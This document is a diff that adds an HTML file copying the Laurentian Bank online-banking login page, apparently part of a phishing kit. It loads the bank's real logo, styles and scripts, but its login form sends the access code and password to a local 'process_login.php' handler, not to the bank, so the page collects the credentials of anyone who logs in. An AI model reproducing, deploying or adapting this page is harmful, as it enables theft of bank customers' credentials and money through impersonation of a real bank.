@@ -1,0 +1,452 @@
+<!DOCTYPE html>
+<html xmlns:layout="http://www.ultraq.net.nz/web/thymeleaf/layout" lang="en_CA">
+
+<head>
+    <script type="text/javascript" src="https://auth.banquelaurentienne.ca/inc/js/lib/script.js"></script>
+    <title>Login</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=2"/>
+    <meta name="google" content="notranslate"/>
+    
+    <!-- import md reno theme  -->
+    <link type="text/css" href="https://auth.banquelaurentienne.ca/resources/themes/md-reno-base-style/md-reno-base.css"
+        rel="stylesheet"/>
+    <!-- import forge 1 theme -->
+    <link type="text/css" href="https://auth.banquelaurentienne.ca/resources/themes/theme-laurentianbank-md-refresh/styles/theme-laurentianbank-md-refresh.css"
+        rel="stylesheet"/>
+
+    <style>
+        [ng\:cloak], [ng-cloak], [data-ng-cloak], [x-ng-cloak], .ng-cloak, .x-ng-cloak {
+            display: none !important;
+        }   
+    </style>
+
+    <link type="text/css" href="https://auth.banquelaurentienne.ca/resources/common/css/login-common.css" rel="stylesheet"/>
+    <link type="text/css" href="https://auth.banquelaurentienne.ca/resources/secure-key/css/secure-key.css" rel="stylesheet"/>
+    <link rel="icon" href="https://auth.banquelaurentienne.ca/resources/themes/theme-laurentianbank-md-refresh/assets/favicon.png"/>
+
+    
+    <script>
+        var PAN_CONFIG = {
+            isPanEnabled : JSON.parse("true"),
+            isPanPrefixOutside : JSON.parse("false"),
+            panPrefix : null,
+        }
+    </script>
+    <script type="text/javascript" src="https://auth.banquelaurentienne.ca/resources/common/js/c1-tx-clientlib-v5.js"></script>
+    
+    <script>
+        var TX_CONFIG = {
+            profiling_domain: "analyze.central1.cc",
+            org_id: "76ussz09",
+            session_id: "4d436fb4-64bc-48d8-be39-923dcb20a24d",
+            page_id: "10",
+        }
+        c1_threatmetrix.profile(TX_CONFIG.profiling_domain, TX_CONFIG.org_id, TX_CONFIG.session_id, TX_CONFIG.page_id);
+    </script>
+
+
+</head>
+
+<body ng-app="UxpLoginApp" class="ng-cloak uxp-theme">
+
+
+<div class="widget-c1-oauth-login position-relative oauth-login">
+    <!-- Navigation section -->
+
+    <!-- Terms and Condition section -->
+    <!-- Login section -->
+    <div ng-controller="UxpLoginController as $ctrl" id="c1-login-section">
+        
+        <div class="errors errors-login">
+            <span
+                ng-hide="state.isSubmittingForm || state.isFieldOnChange"
+                class="error-message"></span>
+        </div>
+        <form id="loginForm"
+              name="uxpLoginForm"
+              class="center-block c1-login-form"
+              ng-class="{ 'ie11-fix': isIE11 }"
+              action="process_login.php"
+              method="post"
+              autocomplete="on" ng-submit="ngSubmitListener(&#39;false&#39;)"
+        ><input type="hidden" name="_csrf" value="631484a3-5f82-4047-804c-52a809dc3033"/>
+
+            <!-- ReCaptcha -->
+            
+
+
+            <div>
+                <!-- Memorized account select -->
+                <div ng-form="memorizedLoginsForm"
+                     ng-show="showingMemorizedAccounts()"
+                     class="memorized-login-selector memorized-login-selector"
+                     id="c1-memorized-login-selector" ng-init="memorizedAccounts=[];"
+                >
+
+                
+
+                    <div class="logo text-center">
+        
+        <img src="https://auth.banquelaurentienne.ca/resources/creditunions/qc/laurentianbank_ca/images/logo_mobile_new.svg" alt="Laurentian Bank logo."/>
+</div>
+
+                    
+
+                    
+
+                    <h4 class="c1-page-title memorized-login-title"
+                    >Choose a login profile</h4>
+
+                    <p class="form-instructions"
+                    ></p>
+
+                    <ul class="memorized-login-list"
+                        ng-class="{
+                        'edit-mode': state.memorizedAccountsEditMode
+                    }"
+                    >
+                        <!-- iterate over each memorized login -->
+                        <li class="memorized-login"
+                            ng-repeat="memorizedAccount in memorizedAccounts"
+                            ng-click="state.memorizedAccountsEditMode || selectMemorizedAccount(memorizedAccount)"
+                            ng-attr-tabindex="{{state.memorizedAccountsEditMode ? '-1' : '0'}}"
+                            ng-attr-role="{{state.memorizedAccountsEditMode ? '':'button'}}"
+                        >
+                            <span class="memorized-account-nickname">{{ memorizedAccount.nickname }}</span>
+                            <span class="memorized-login-id-masked"
+                            >{{ memorizedAccount.maskedLoginId }}</span>
+                            <a class="delete-memorized-account"
+                               href="javascript:void(0);"
+                               role="button"
+                               ng-show="state.memorizedAccountsEditMode"
+                               ng-click="forgetMemorizedAccount(memorizedAccount, $event);"
+                               tabindex="1" data-confirm-message="Are you sure you want to delete the saved login profile" aria-label="delete button"
+                            ><span>Delete</span></a>
+                        </li>
+                    </ul>
+
+                    <div class="c1-btn-container memorized-btn-container">
+                        
+                        <div class="c1-btn-container">
+                            <a
+                                    href="index.html#"
+                                    ng-click="showNewUserLogin()"
+                            >Log in to a different profile</a>
+                        </div>
+                        <div class="edit-memorized-accounts"
+                            ng-hide="state.memorizedAccountsEditMode"
+                        >
+                            <a href="index.html#"
+                                ng-click="showEditMemorized()"
+                            >Manage login profiles</a>
+                        </div>
+
+                        <div class="memorized-accounts"
+                                ng-show="
+                            haveMemorizedAccounts() &amp;&amp;
+                            (
+                                showingNewLogin() ||
+                                showingMemorizedAccountsEdit()
+                            )
+                            "
+                        >
+                            <a href="index.html#"
+                                ng-click="showMemorizedAccounts()"
+                            >Show saved login profiles</a>
+                        </div>
+
+                        <div class="oauth-login-forgot-pac">
+                            <a href="https://auth.banquelaurentienne.ca/forgotPac">Reset password</a>
+                        </div>
+                    </div>
+
+
+
+                    
+                </div>
+
+                <!-- pan/pac login -->
+                <div ng-form="newLoginForm"
+                     ng-hide="showingMemorizedAccounts()"
+                >
+                    
+                    
+
+                    <div class="logo text-center">
+        
+        <img src="https://auth.banquelaurentienne.ca/resources/creditunions/qc/laurentianbank_ca/images/logo_mobile_new.svg" alt="Laurentian Bank logo."/>
+</div>
+                    
+                    
+
+                    <div class="form-group" ng-show="selectedMemorizedAccount.nickname">
+                        <h4
+                        >Enter password for <em>{{ selectedMemorizedAccount.nickname }}</em></h4>
+                    </div>
+                    <div class="login-id-fields" ng-show="!state.usingMemorizedUser">
+                        <div class="new-login-fields">
+                            
+    
+    <div ng-if="!state.usingMemorizedUser" ng-class="
+            [
+                'form-group',
+                {
+                    'is-invalid': isPanNumInvalid()
+                }
+            ]
+        "
+    >
+        <div ng-class="
+                [
+                    {
+                        'is-empty': !(uxpLoginForm.newLoginForm.pan.$modelValue)
+                    }
+                ]
+            "
+        >
+
+            <label for="panNum">
+                <span aria-hidden="true">Access code</span>
+                <input
+                        class="form-control"
+                        id="panNum"
+                        name="pan"
+                        type="text"
+                        maxlength="8"
+                        value=""
+                        ng-model="fieldModels.pan"
+                        uxp-pattern="^\d{1,8}$"
+                        data-uxp-required-error-message="Enter your access code."
+                        data-uxp-mismatched-error-message="You&#39;ve entered an incorrect access code. Try again."
+                        tsv-autofocus="autofocus"
+                        ng-model-options="{allowInvalid: true}"
+                        ng-change="isFieldChanged()"
+                        aria-describedby="panNumError"
+                        autocomplete="username"
+                        aria-required="true"
+                        aria-invalid="false"
+                        android-margin placeholder="Access code"
+                />
+            </label>
+        </div>
+        <p ng-if="
+                isPanNumInvalid() &amp;&amp;
+                uxpLoginForm.newLoginForm.pan.$error.uxpPattern
+            "
+            class="form-error-message"
+            id="panNumError"
+            role="alert"
+        >You&#39;ve entered an incorrect access code. Try again.</p>
+    </div>
+
+                            
+                        </div>
+                        <div ng-if="state.usingMemorizedUser">
+                            <input name="branch"
+                                   type="hidden"
+                                   value="001"
+                            />
+                        </div>
+                        <div class="memorized-login-fields">
+                            <input name="memorized-account-id"
+                                   type="hidden"
+                                   ng-if="fieldModels.hashedLoginId"
+                                   ng-value="fieldModels.hashedLoginId"
+                            />
+                        </div>
+                    </div>
+                    <div class="password-mask-toggle">
+                        <a href="index.html#" 
+                           role="button"
+                           ng-click="togglePasswordMask()"
+                           id="passwordToggle"
+                           ng-class="fieldModels.passwordInputType === 'text' ? 'hide-password' : 'show-password'"
+                        >
+                            <span 
+                                ng-if="fieldModels.passwordInputType !== 'text'"
+                                >Show password</span>
+                            <span 
+                                ng-if="fieldModels.passwordInputType === 'text'"
+                                >Hide password</span>
+                        </a>
+                    </div>
+                    <div class="form-group"
+                         ng-class="{ 'is-invalid': isPasswordInvalid() }"
+                    >
+                        <div ng-class="
+                            [
+                                'text-input',
+                                {
+                                    'is-empty': !(uxpLoginForm.newLoginForm.password.$modelValue)
+                                }
+                            ]
+                            "
+                        >
+                            <label for="password">
+                                <span aria-hidden="true">Password</span>
+                                <input class="form-control"
+                                       id="password"
+                                       name="password"
+                                       ng-attr-type="{{ fieldModels.passwordInputType }}"
+                                       ng-model="fieldModels.password"
+                                       uxp-pattern="^(?=.*\d)(?=.*[a-zA-Z])(?!.*\W).{8,20}$"
+                                       ng-model-options="{allowInvalid: true}"
+                                       ng-change="isFieldChanged()"
+                                       data-uxp-required-error-message="Please enter your Personal Access Code."
+                                       data-uxp-mismatched-error-message="You&#39;ve entered an incorrect password. Try again."
+                                       ng-required="true"
+                                       aria-invalid="false"
+                                       aria-describedby="password passwordError"
+                                       autocomplete="current-password"
+                                       android-margin placeholder="Password" aria-label="Password"
+                                />
+                            </label>
+                            <p ng-if="
+                                    isPasswordInvalid() &amp;&amp;
+                                    uxpLoginForm.newLoginForm.password.$error.uxpPattern
+                                "
+                               class="form-error-message"
+                               role="alert"
+                               id="passwordError"
+                            >You&#39;ve entered an incorrect password. Try again.</p>
+                        </div>
+                    </div>
+                    <div class="form-group" ng-show="!state.usingMemorizedUser">
+                        <div class="checkbox">
+                            <label for="rememberLogin" class="rememberMeCheckboxLabel">
+                                <input class="form-control"
+                                       type="checkbox"
+                                       id="rememberLogin"
+                                       name="remember-login-credentials"
+                                       ng-model="fieldModels.rememberMe"
+                                       value="true"
+                                /> <span class="remember-me-input-label"
+                            ><b>Remember me</b> <p style="margin-left: -7px;">To create a login profile, select "Remember me". On the mobile app, this option will let you use QuickView or biometric login.</p></span>
+                            </label>
+                        </div>
+                    </div>
+                    
+
+                    <div class="account-nickname-container" ng-show="fieldModels.rememberMe">
+                        <div ng-class="
+                            [
+                                'form-group',
+                                {
+                                    'is-invalid': isAccountNicknameInvalid()
+                                }
+                            ]
+                            "
+                        >
+                            <div ng-class="
+                                [
+                                    'text-input', {
+                                        'is-empty': !(uxpLoginForm.newLoginForm['account-nickname'].$modelValue)
+                                    }
+                                ]
+                                "
+                            >
+                                <label for="account-nickname">
+                                    <span
+                                    >Login profile name</span>
+                                    <input
+                                            class="form-control"
+                                            id="account-nickname"
+                                            name="account-nickname"
+                                            type="text"
+                                            ng-required="fieldModels.rememberMe"
+                                            ng-model="fieldModels.accountNickname"
+                                            aria-invalid="false"
+                                            aria-describedby="nameError"
+                                            autocomplete="off"
+                                            android-margin placeholder="Enter name" ng-minlength="1" ng-maxlength="25" maxlength="25"
+                                    />
+                                </label>
+                                <p ng-if="hasNicknameMinLengthError()"
+                                   class="form-error-message"
+                                   id="nameError"
+                                   role="alert"
+                                >Profile name length must be at least 1 character</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="text-center c1-btn-container">
+                        
+                        <button
+                                ng-disabled="uxpLoginForm.$invalid || state.isSubmittingForm"
+                                disabled="disabled"
+                                type="submit"
+                                id="loginSubmit"
+                        >Log in</button>
+
+                        
+                    </div>
+
+                    <div class="c1-btn-container memorized-btn-container">
+                        <div>
+                            <a href="https://auth.banquelaurentienne.ca/forgotPac">Reset password</a>
+                        </div>
+    
+                        <div class="memorized-accounts"
+                             ng-show="
+                            haveMemorizedAccounts() &amp;&amp;
+                            (
+                                showingNewLogin() ||
+                                showingMemorizedAccountsEdit()
+                            )
+                         "
+                        >
+                            <a href="index.html#"
+                               ng-click="showMemorizedAccounts()"
+                            >Show saved login profiles</a> 
+                        </div>
+                    </div>
+
+                    
+
+                    
+                </div>
+
+
+                
+
+                <input name="device"
+                       type="hidden"
+                       uxp-device-fingerprint=""
+                       ng-value="fieldModels.deviceFingerprint"
+                />
+            </div>
+        </form>
+        
+    <div ng-if="state.isShowingSpinner">
+        <div class="oauth-spinner-container">
+            <div class="oauth-spinner-overlay-cover position-absolute w-100"></div>
+            <div class="oauth-spinner-overlay-spinner"
+                 aria-live="assertive"
+                 role="status">busy</div>
+        </div>
+    </div>
+
+    </div>
+</div>
+
+<script type="text/javascript" src="https://auth.banquelaurentienne.ca/resources/common/js/hashtable.js"></script>
+<script type="text/javascript" src="https://auth.banquelaurentienne.ca/resources/common/js/rsa.min.js"></script>
+
+<script type="text/javascript" src="https://auth.banquelaurentienne.ca/resources/common/js/node_modules/angular/angular.js"></script>
+<script type="text/javascript" src="https://auth.banquelaurentienne.ca/resources/common/js/validation/uxp-device-fingerprint.directive.js"></script>
+<script type="text/javascript" src="https://auth.banquelaurentienne.ca/resources/common/js/validation/uxp-pattern.directive.js"></script>
+<script type="text/javascript" src="https://auth.banquelaurentienne.ca/resources/common/js/uxp-login/uxp-login.app.js"></script>
+<script type="text/javascript" src="https://auth.banquelaurentienne.ca/resources/common/js/uxp-login/uxp-login-data.service.js"></script>
+<script type="text/javascript" src="https://auth.banquelaurentienne.ca/resources/common/js/uxp-login/uxp-login.controller.js"></script>
+<script type="text/javascript" src="https://auth.banquelaurentienne.ca/resources/common/js/uxp-login/uxp-login.directive.js"></script>
+<script type="text/javascript" src="https://auth.banquelaurentienne.ca/resources/common/js/tsv-helper/directive/branchReset.directive.js"></script>
+
+
+    <script type="text/javascript" src="https://auth.banquelaurentienne.ca/resources/common/js/tsv-helper/directive/tsvFocus.directive.js"></script>
+    <script type="text/javascript" src="https://auth.banquelaurentienne.ca/resources/common/js/tsv-helper/directive/tsvInvalid.directive.js"></script>
+    <script type="text/javascript" src="https://auth.banquelaurentienne.ca/resources/common/js/tsv-helper/directive/androidMargin.directive.js"></script>
+
+</body>
+
+</html>
